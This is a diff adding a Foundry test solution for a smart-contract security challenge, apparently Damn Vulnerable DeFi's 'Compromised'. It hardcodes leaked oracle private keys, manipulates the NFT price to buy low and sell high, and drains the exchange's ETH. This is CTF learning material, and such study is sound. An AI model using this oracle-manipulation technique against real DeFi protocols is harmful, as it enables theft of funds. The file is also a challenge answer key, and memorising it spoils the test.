@@ -75,7 +75,47 @@ contract CompromisedChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_compromised() public checkSolved {
-        
+        // Decoded private keys from the leaked hex strings:
+        // "4d 48 67..." -> base64 -> "0x7d15..." (oracle source 1)
+        // "4d 48 67..." -> base64 -> "0x68bd..." (oracle source 2)
+        uint256 oracle1PK = 0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744;
+        uint256 oracle2PK = 0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159;
+
+        // Step 1: Manipulate oracle to set NFT price to nearly 0
+        vm.prank(vm.addr(oracle1PK));
+        oracle.postPrice("DVNFT", 0);
+
+        vm.prank(vm.addr(oracle2PK));
+        oracle.postPrice("DVNFT", 0);
+
+        // Step 2: Buy NFT at the manipulated low price
+        vm.startPrank(player);
+        uint256 nftId = exchange.buyOne{value: 1}();
+        vm.stopPrank();
+
+        // Step 3: Manipulate oracle to set NFT price to exchange's balance
+        vm.prank(vm.addr(oracle1PK));
+        oracle.postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE);
+
+        vm.prank(vm.addr(oracle2PK));
+        oracle.postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE);
+
+        // Step 4: Sell NFT at the manipulated high price
+        vm.startPrank(player);
+        nft.approve(address(exchange), nftId);
+        exchange.sellOne(nftId);
+        vm.stopPrank();
+
+        // Step 5: Restore oracle price to original value
+        vm.prank(vm.addr(oracle1PK));
+        oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
+
+        vm.prank(vm.addr(oracle2PK));
+        oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
+
+        // Step 6: Transfer the exchange's ETH to recovery account
+        vm.prank(player);
+        payable(recovery).transfer(EXCHANGE_INITIAL_ETH_BALANCE);
     }
 
     /**
